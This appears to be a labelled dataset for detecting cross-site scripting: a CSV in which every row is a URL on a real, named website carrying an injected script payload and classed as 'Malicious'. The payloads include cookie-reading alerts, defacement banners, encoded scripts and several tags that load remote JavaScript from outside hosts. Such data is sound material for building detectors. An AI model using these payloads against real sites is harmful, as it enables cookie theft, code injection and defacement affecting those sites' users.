Payloads,Class
http://www.topgunlimousine.com/registration/freesite/register.asp?id=39667&amp;email=tglimousine@yahoo.c<br>om&amp;site=4}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee<br>%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss<br>/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.sgi.com/cgi-bin/search?q=%27%3balert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%<br>2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2883%2c69%2c67%2c85%2c<br>82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcharcode%2883%2c69%2c67%2c<br>85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2883%2c69<br>%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscr<br>ipt%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%<br>3c%2fscript%3e&amp;btng=&amp;client=sgi&amp;proxystylesheet=http%3a%2f%2fwww.sgi.com%2fstyles%2fnew%2fsgi_xslt.h,Malicious
http://www.carrefour.com/cdc/search-engine/?search=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/t<br>hirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://encyclopedia.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b<br>%3c%2fscript%3e,Malicious
http://www.cryingpuppet.com/musicians.asp?ara=%22%3e%3cscript%3ealert%28%22maxwel%22%29%3c%2fscript%<br>3e&amp;x=9&amp;y=7,Malicious
http://www.avast.com/eng/home-registration.php?lang=%22%3e%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3e%3cmarquee%3e%3ch1%3eby+st@rext%3c/h1%3e%3c/marquee%3e,Malicious
http://www.webstore.com/search.php?search_empty=1&amp;option=basic_search&amp;keywords_search=&amp;buyout_price=<br>&amp;reserve_price=&amp;quantity=&amp;enable_swap=&amp;list_in=&amp;results_view=&amp;country=&amp;zip_code=&amp;username=&amp;basic_sea<br>rch=foob%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://search.hccg.gov.tw/irms22/samplekits_std_jsp/demo_files_search_ch.jsp?author=&amp;encode=&amp;filedat<br>e1=&amp;filedate2=&amp;filename=&amp;filepath=&amp;filesize=&amp;filetype=&amp;title=&amp;a=10&amp;o=&amp;oa=1&amp;p=%e7%b6%b2%e5%9d%80&amp;s=po<br>stdb%2cpiecedb%2chccgweb%2cweb1%27,%27%27,%27%27,%27res%27,%2733%27,%27%27)%27%22%3e%3c/title%3e%3cs<br>cript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee<br>%3e",Malicious
http://www.cais-acsi.ca/search.asp?year='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee<br>%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.fcb.cz/index.php?rubrika='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cmarquee%3ewhitehat%<br>20forever%3c/marquee%3e&amp;rubrika2='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cmarquee%3ewhitehat%20f<br>orever%3c/marquee%3e,Malicious
http://mediaguide.admin.cam.ac.uk/cgi-bin/faesearch/mword_search1.cgi?args=&lt;script&gt;alert(&quot;xss&quot;)&lt;/scr<br>ipt&gt;,Malicious
http://philadelphia.phillies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scr<br>ipt&gt;,Malicious
http://www.comm.ecowas.int/sec/index.php?id=treaty&amp;lang=en%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e,Malicious
https://www.hsbc.fi.cr/hsbcenlinea/a/generales/error.asp?num=1&amp;txt=%3cscript%3ealert%28string.fromch<br>arcode%2888%2c83%2c83%29%29%3c%2fscript%3e,Malicious
http://search.klcg.gov.tw/irms22/samplekits_std_jsp/search_result.jsp?s=act&amp;s=news&amp;s=msg&amp;s=klcgen&amp;a=<br>10&amp;o=&amp;oa=1&amp;o=&amp;title=&amp;filename=&amp;author=&amp;filepath=&amp;encode=&amp;filetype=&amp;filedate1=&amp;filedate2=&amp;filesize=&amp;p<br>=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol<br>%3c%2fh1%3e%3c%2fmarquee%3e&amp;i1.x=40&amp;i1.y=7,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-nom-de-famille/nom.asp?nom=&quot;&gt;&lt;body+onload=alert(&quot;s<br>tarxt&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.govdelivery.com/company/webinars/request/?webinar=%22%3e%3cscript+src=http://starext.by.r<br>u/lt.js%3e,Malicious
http://www.the213.net/php/article.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%<br>3e,Malicious
http://www.smile.fr/recherche/(offset)/10/(searchtext)/jahia%22'/%3e%3cscript%3ealert('hello%20the%2<br>0rat')%3c/script%3e/(searchsubtree)/148%22'/%3e%3cscript%3ealert('hello%20the%20rat')%3c/script%3e,Malicious
http://www.warez-portalz.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e,Malicious
http://www.apil.com/search-results.php?action=findlawyer&amp;region=&amp;specialism=%22%3e%27%3e%3cscript%3e<br>alert(123)%3c/script%3e,Malicious
http://www.sonmezeczanesi.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
"http://3plus.uol.com.br/2004/envia_news.asp?news=559&amp;titulo=&lt;script&gt;alert(string.fromcharcode(88,83,<br>83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,117,115,11<br>6,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.opengroup.org/testing/linux-test/%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sour<br>ce));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
http://www.dayform.com/link.php?ref='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://www.adobe.com/cfusion/gpr/index.cfm?v=3&amp;product=flash&amp;loc=en&amp;country=us&amp;platform=2&amp;givenname=<br>test&amp;familyname=test&amp;email=asdf@asdf.com&amp;optin=0&amp;serialnumber=%22%3e%3cscript%3ealert(%22i-landet%22<br>)%3c/script%3e,Malicious
http://www.gigcities.com/cgi-bin/xpanel/amanager.cgi?persistent=&amp;login=%22%3e%3cscript%3ealert%28%27<br>hacking-gurus.com+pwned+by+%21%21neo%21%21+hacking-gurus.com%27%29%3c%2fscript%3e%3cimg+src%3d%22htt<br>p%3a%2f%2fimg149.imageshack.us%2fimg149%2f1232%2flogonj5.gif%22%3e%3c,Malicious
http://jisoengine.sourceforge.net/q.php?q=404&amp;req=overview/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.devnull.jp/tdiary/?year=2007%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e;month=3q;catego<br>ry=etc,Malicious
http://www.linternaute.com/femmes/cuisine/cgi/recherche/recherche.php?f_nom_deposant=%22%3e%3cmarque<br>e%3edefaced_by_ironzorg%20defaced_by_ironzorg%20defaced_by_ironzorg%20defaced_by_ironzorg%20defaced_<br>by_ironzorg%20defaced_by_ironzorg%20defaced_by_ironzorg%20defaced_by_ironzorg,Malicious
http://www.davidguetta.com/fr/forum/110?page=1&form_build_id=form-1499b749b5a7c9b321d98efb96704d99&form_id=user_login_block&op=connexion&destination=%27--%3e%3c%2fscript%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e%3cscript%3e,Malicious
http://www.ntnu.no/kunnskapskalenderen/xinha/plugins/forms/popups/textarea.html%22%3e%3cscript%3eale<br>rt(document.cookie)%3c/script%3e,Malicious
http://www.kaspersky.co.kr/board/bbs/board.php?bo_table=news&amp;wr_id=61&amp;page=&quot;&gt;&lt;script&gt;alert(document.<br>cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gcasda.org/_sections/galleries/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.everified.com//results/email/?email=%22%3e%3cscript%3ealert%28%27killer-tr%27%29%3c%2fscr<br>ipt%3e,Malicious
http://stampa.aeronautica.difesa.it/download.asp?id=categoria%3cscript%3ealert%28%22discover%20by%20s1ckb0y%22%29;%3c/script%3e&tipo=audio,Malicious
http://connexions.rediff.com/connexions/main.php?do=peoplesearch&amp;from=indexpage&amp;query=\%22%3e%3cscri<br>pt%3ealert(1)%3c/script%3e&amp;submit=search,Malicious
http://super.balsas.lt/index.php?cid=35&amp;search=name&amp;query=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
https://bankingportal.sparkasse-bad-hersfeld-rotenburg.de/banking/?konto=%22%3e%3ciframe%20src=http:<br>//www.google.de%3e,Malicious
http://www.ikhwanweb.com/article.php?id=29492%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%<br>3e,Malicious
http://torrentleech.org/user/chat/guest?username=%2f%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;su<br>bmit=chat,Malicious
http://www.vodpornos.com/index.php?event=showmovielist&amp;search%3aq=%22%3e%3cscript%3ealert(1)%3c%2fsc<br>ript%3e&amp;search%3asearch=go&amp;search%3amethod=titlesearch,Malicious
http://www.persianblog.ir/signin.asp?target='%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.agisweb.nl/voor_consumenten/zoekresultaat?cx=004067807135607596739%3af-p7rdiyulc&amp;cof=fori<br>d%3a11&amp;ie=utf-8&amp;view=searchresults&amp;q=&quot;&gt;&lt;script&gt;alert+('killer-tr')&lt;%2fscript&gt;'&quot;&gt;&lt;iframe+src%3dhttp:/<br>/www.reizen-ts.net/img/trk/turkije_vlag.jpg&gt;#262,Malicious
http://icperthshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.o<br>rg/)%3c/script%3e%3cp,Malicious
http://www.nationalrail.co.uk/site_help/search.html?query=%22%3e%3cscript%3ealert(%2fxss%2f)%3c%2fsc<br>ript%3e,Malicious
http://aboutcsl.com/photo_gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.webariza.net/forum/non_rte_javascript.asp?textarea=%3ch1%3est@rext%3c/h1%3e%3cmarquee%3e%<br>3ch1%3eby%20st@rext%3c/h1%3e%3c/marquee%3e,Malicious
http://www.crt.com.tr/search.asp?mode=allwords&amp;search=sistemlerini&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script<br>&gt;,Malicious
http://www.turkishdailynews.com.tr/apdetailspage.php?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%2<br>0by%20trex/h1&gt;,Malicious
http://www.hackzone.us/search.shtml?q=%22%3e%27%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscr<br>ipt%3e&amp;w=cracks,Malicious
http://www.benq.co.in/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://e-words.jp/?q='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e&amp;cx=00356827414<br>5226911062%3adfxin19bvrq&amp;hl=ja&amp;lr=lang_ja&amp;ie=shift_jis&amp;oe=shift_jis&amp;inlang=ja&amp;headline=%8c%a9%8fo%82<br>%b5%8c%ea&amp;cof=forid%3a11,Malicious
http://www.infolinks.com/signup/your-script.html?denied=true&amp;pid=166387&amp;url=%3cscript%3ealert('http:<br>//www.t3ch.in');%3c/script%3e,Malicious
http://www.safran-group.com/recherche.php3?recherche=+%7d%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dal<br>ert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+b<br>y+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=4&amp;y=4&amp;lang=fr,Malicious
http://maps2.nris.mt.gov/topofinder1/searchtool.asp?letter=%22%3e%3cscript%3ealert('by%20encore')%3c<br>/script%3e,Malicious
http://europa.eu/youth/forgotpass.cfm?cpage=2&l_id=en&mail=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://acm.cs.binghamton.edu/contestmanager/websvn/log.php?repname=contest%20manager&amp;path=%2fmanager<br>%2f&amp;search=%22%3e%3ciframe%20src=http://google.com%3e,Malicious
http://www.gewuerzshop.de/gw_cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.googlefight.com/index.php?lang=';alert(string.fromcharcode(88,83,83))//\';alert(string.fr<br>omcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,8<br>3,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://afnet.jp/q?i=service/client/index&amp;m=%22%3e'%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/<br>script%3e,Malicious
http://www.bigbizz.net/escada/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://partnerlocator.symantec.com/public/search;country=%3cmarquee%3e%3ch1%3es_e_ym_e_nwashere%3c/h<br>1%3e%3c/marquee%3e;v=view/,Malicious
http://www.campinas.sp.gov.br/?codmodelo=22&amp;busca=%27%3balert%28string.fromcharcode%2883%2c69%2c67%2<br>c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2883%2c6<br>9%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcharcode%288<br>3%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string.fromchar<br>code%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscript%3e%22%<br>3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c<br>85%2c88%29%29%3c%2fscript%3e&amp;bt_ok=ok,Malicious
http://www.universal-alliance.de/index.php?site=message&msg=<script>alert(1)</script>,Malicious
http://www.aviationweather.gov/adds/tafs/index.php?station_ids=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;std_trans=standard&amp;submit_taf=get+tafs,Malicious
http://pasqua.ath.cx/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://cimcime.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.digg.com.my/?o=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;<br>/marquee&gt;,Malicious
http://www.rinkle.com/abbypics/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mtv.com/games/arcade/game/play.jhtml?arcadegameid=10141651%22%3e%3c/script%3e%3cscript%3e<br>alert(%22airroxssed%22);%3c/script%3e%3c!--,Malicious
"http://no.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
http://www.mcdonalds.com.tr/reklamlar.asp?mainid=3&amp;subid=3&amp;item=%22%3e%3cscript%3ealert(%27drakula%2<br>7)%3c/script%3e%3cmarquee%3e%3ch1%3edafeced%20by%20drakula%3c/h1%3e%3c/marquee%3e,Malicious
"http://hackersnews.co.kr/note/skin_board/s_build_cafeblog/util4_iframe_calendar.php?board=myhomeboar<br>d&amp;category=33&amp;requ_y=2007&amp;requ_m=8%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83,32,66,121<br>,32,107,117,115,111,109,105,115,111,46,111,109))%3c/script%3e",Malicious
http://icnorthwales.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.o<br>rg/)%3c/script%3e%3cp,Malicious
http://www.smokerswelcome.com/cam/dtclogin.jsp?brand=csdthai%22%3e%3cscript%3ealert(%22i-landet%22);<br>%3c/script%3e,Malicious
http://www.issp.u-tokyo.ac.jp/cgi-bin/detail.cgi?c=socie'%3e%22%3e%3cscript/src=http://kusomiso.com/<br>xss.js%3e%3c/script%3ety_table::427,Malicious
http://nl.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
http://www.techsoup.org/fb/index.cfm?fuseaction=forums.showsingleforum&amp;forum=2022&amp;cid=&quot;&gt;&lt;script&gt;aler<br>t(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.googlealert.com/toolkit_inner.php?u=%22%3e%3cscript%3ealert(string.fromcharcode(88,83,83,<br>32,66,121,32,77,114,68,111,117,103))%3c/script%3e%3cx=%22",Malicious
"https://neptest.nonstop.compaq.com/buildpage.asp?page=%22%3e%3cbody%20background=%22http://www.lenag<br>old.ru/fon/ori/sneg/snow29.gif%22%3e%3cscript%3ealert%28%22without%20music,%20life%20would%20be%20a%<br>20mistake..%20by%20sony%22%29%3c/script%3e%3cimg%20src=http://media.bigoo.ws/content/christmas/gif_b<br>ells/bells_35.gif%20align=center%3e%3ciframe%20width=%22520%22%20height=%22415%22%20src=%22http://ww<br>w.youtube.com/embed/boakprzrkpi%22%20frameborder=%220%22%20allowfullscreen%3e%3c/iframe%3e%3cimg%20s<br>rc=http://media.bigoo.ws/content/christmas/gif_bells/bells_35.gif%20align=center%3e%3cimg%20src=http<br>://foxtrotters.tripod.com/ansnowmn2.gif%20align=center%3e",Malicious
"http://www.imls.gov/search.asp?keyword=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromc<br>harcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,8<br>3))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://miojob.repubblica.it/offerte/lavoro/cerca?terms=%22%3e%3cscript%3ealert(1);%3c/script%3e%22,Malicious
http://www.eho.wa.gov/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scripts<br>/hotpockets.js%3e,Malicious
http://www.malavannas.se/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.oglumuncuku.com/login.asp?n=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h<br>1&gt;&lt;/marquee&gt;,Malicious
http://partnerlocator.symantec.com/public/search;city=totalschaden%22%3e%3cscript%3ealert%28%22total<br>schaden%22%29%3c%2fscript%3e;locale=de-de;company=totalschaden%22%3e%3cscript%3ealert%28%22totalscha<br>den%22%29%3c%2fscript%3e;m=no_records/,Malicious
http://www.level3.com/modules/popframe.cfm?cid=afmit051809_ib3%22%3e%3c%2f%69%66%72%61%6d%65%3e%3c%7<br>3%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72<br>%69%70%74%3e%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%68%74%74%70%3a%2f%2f%76%75%6c%6e%2e%78%73%73%65%<br>64%2e%6e%65%74%2f%74%68%69%72%64%70%61%72%74%79%2f%73%63%72%69%70%74%73%2f%78%73%73%65%64%2e%67%69%6<br>6,Malicious
http://www.sancarlosbythesea.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://kisi.deu.edu.tr/moral/test.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][]=%3cscript%20src=http://hiphopshare.xm.com/xss.js,Malicious
http://www.dinvekitap.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://hbk-gaia.dyndns.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/scr<br>ipt%3e,Malicious
http://www.armenianquestion.org/page.php?modul=user&amp;op=userinfo&amp;username=%22%3e%3cscript%3ealert(%22<br>backdoor%22)%3c/script%3e,Malicious
http://support.damanet.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/c%20ha<br>t/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(documen%2<br>0t.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.comodo.com/products/wizard/package.php?p=%3cscript%3ealert%28\..\ ^_^<br>/../%29%3c/script%3e%27%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e%3ciframe%20src%20=h<br>ttp://www.youtube.com/watch?v=gmgit16p-li%22%20width=%221480%22%20height=%221435%22%20\%3e%3c/div%3e,Malicious
http://www.eib.europa.eu/search/index.asp?style=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious
http://elenet.org/buscador/default.asp?search=%22%3cscript%3ealert(%22found%20by%20hotpockets%20of%2<br>0backslashsecurity.org%22)%3c/script%3e,Malicious
http://search.hit.bg/?what=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22&amp;where=3,Malicious
https://chart.donhr.navy.mil/jobsearch/searchresultse.asp?stype=9&amp;kw=%27%22%3e%3c%2ftitle%3e%3cscrip<br>t%3ealert(1337)%3c%2fscript%3e&amp;scountry=9&amp;sstate=&amp;scity=&amp;sseries=&amp;spplan=&amp;splevel=&amp;sclaiment=&amp;ssalar<br>y=%27%22%3e%3c%2ftitle&amp;sortby=2&amp;san=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;pa<br>ge=1,Malicious
http://www.ppa.com/login.cfm?nextpage=/i4a/pages/index.cfm?pageid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bulutangkis.com/mod.php?mod=publisher&amp;op=search&amp;query=%3cscript%3ealert%28document.cookie<br>%29%3c/script%3e,Malicious
http://www.raileurope.com/us/gsearch/search_results.htm?fn=search&amp;wt.seg_1=searchbox&amp;q=%3cscript%3ea<br>lert(%22iblaze%22)%3c%2fscript%3e&amp;fn=search,Malicious
http://www.myfoxny.com/search/serp?search_type=site&amp;top_search_field=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;sm<br>=&amp;srm=&amp;startindex=0&amp;currentpage=1,Malicious
"http://search.president.ir/search.php?term=f00z%3cscript%3edocument.write(string.fromcharcode(60,115<br>,99,114,105,112,116,62,97,108,101,114,116,40,34,65,104,109,97,100,105,110,101,106,97,100,44,32,112,9<br>7,119,110,51,100,33,32,71,111,32,115,117,99,107,32,109,121,32,46,46,46,46,46,34,41,59,60,47,115,99,1<br>14,105,112,116,62,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119<br>,46,98,114,101,105,116,98,97,114,116,46,99,111,109,47,97,114,116,105,99,108,101,46,112,104,112,63,10<br>5,100,61,48,54,49,50,49,49,49,51,48,50,53,55,46,121,112,102,107,122,112,53,98,38,115,104,111,119,95,<br>97,114,116,105,99,108,101,61,49,34,32,119,105,100,116,104,61,34,49,50,48,48,112,120,34,32,104,101,10<br>5,103,104,116,61,34,49,48,48,48,112,120,34,62,60,47,105,102,114,97,109,101,62))%3c/script%3e&amp;cs=1&amp;ke<br>yphrase=all&amp;langid=fa&amp;x=0&amp;y=0",Malicious
http://www.schulzbonn.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.video-reader.com/plus/search.php?keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusom<br>iso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.faith-go.co.jp/lists/viewitem_parts.asp?cid=00006&amp;fl='%3e%22%3e'%3e%3cscript%3ealert(%22k<br>usomiso.com%22)%3c/script%3e4&amp;hid=&amp;list=new&amp;id=000000200519175,Malicious
